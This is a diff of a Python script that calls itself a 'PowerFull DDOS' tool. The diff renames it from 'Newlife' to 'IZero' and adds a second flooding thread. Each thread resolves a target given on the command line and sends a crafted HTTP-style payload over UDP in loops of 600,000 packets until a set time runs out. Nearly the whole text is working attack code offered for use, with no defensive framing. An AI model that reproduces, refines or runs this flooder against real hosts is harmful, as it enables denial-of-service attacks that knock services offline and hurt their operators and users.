@@ -140,7 +140,7 @@ acceptall = [
      'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n']
 
 def main():
-    print("                           Newlife")
+    print("                           IZero")
     print("                           PowerFull DDOS")
     print("                           Make By IZero")
     print('')
@@ -150,67 +150,16 @@ def main():
     target = socket.gethostbyname(ip)
     url = 'google.com'
     start_time = time.time()
-    print("\033[1m[Newlife] Newlife Now Using PPS Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
+    print("\033[1m[IZero-Destroyer] IZero Now Using PPS Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
     addr = (str(target), int(port))
 
             
     ip_get = socket.gethostbyname(url)
     massive_headers = { # PPS
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,  
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
-                "Content-Length": "\r\n" * 1024,
+                "Content-Length": "#" * 1024,
             }
     
-    request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\nCookie: session=.eJytjksKgzAURbcS3jiRovajW-ik8yLy1Jso1bTkBVoR9950D52cMzhwuRu1dmYZIVTfN1IxiRaIsANpumJVDh6B4_T0SlL4GZ_XFDBk6jaDBSqGVbHjyWfU7Po_M41O1wJkpNryLNDk8W4fWKmmRGPzvmOUheGOK1P2p6O5DMjNGTlXhbVFd2Dav_PfS3M.ZxsclA.bQKpiHl0OVPQBrIM_7U-7ZifvDs\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
+    request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
     byte = request.encode()
     while time.time() - start_time < times:
         try:
@@ -218,26 +167,62 @@ def main():
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 6000)
             for x in range(600000): #PPS
               s.sendto(byte,addr)
           except:
              continue
         except:
             continue
-    print("\033[1m[Newlife] Newlife Now Stop Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
+    print("\033[1m[IZero-Destroyer] iZero Now Stop Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
     sys.exit()
 
 
-
-if __name__ == "__main__":
-    izero = threading.Thread(target=main)
-    izero.start()
+def main2():
+    print("                           IZero")
+    print("                           PowerFull DDOS")
+    print("                           Make By IZero")
+    print('')
     ip = str(sys.argv[1])
     port = int(sys.argv[2])
     times = int(sys.argv[3])
-    os.system(f"sudo python3 ddos2.py {ip} {port} {times}")
+    target = socket.gethostbyname(ip)
+    url = 'google.com'
+    start_time = time.time()
+    print("\033[1m[IZero-Destroyer] IZero Now Using PPS Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
+    addr = (str(target), int(port))
+
+            
+    ip_get = socket.gethostbyname(url)
+    massive_headers = { # PPS
+                "Content-Length": "#" * 1024,
+            }
+    
+    request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
+    byte = request.encode()
+    while time.time() - start_time < times:
+        try:
+          try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            for x in range(600000): #PPS
+              s.sendto(byte,addr)
+          except:
+             continue
+        except:
+            continue
+    print("\033[1m[IZero-Destroyer] iZero Now Stop Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
+    sys.exit()
+
+if __name__ == "__main__":
+    izero = threading.Thread(target=main)
+    izero2 = threading.Thread(target=main2)
+    izero.start()
+    izero2.start()
+    ip = str(sys.argv[1])
+    port = int(sys.argv[2])
+    times = int(sys.argv[3])
+
 
 
 
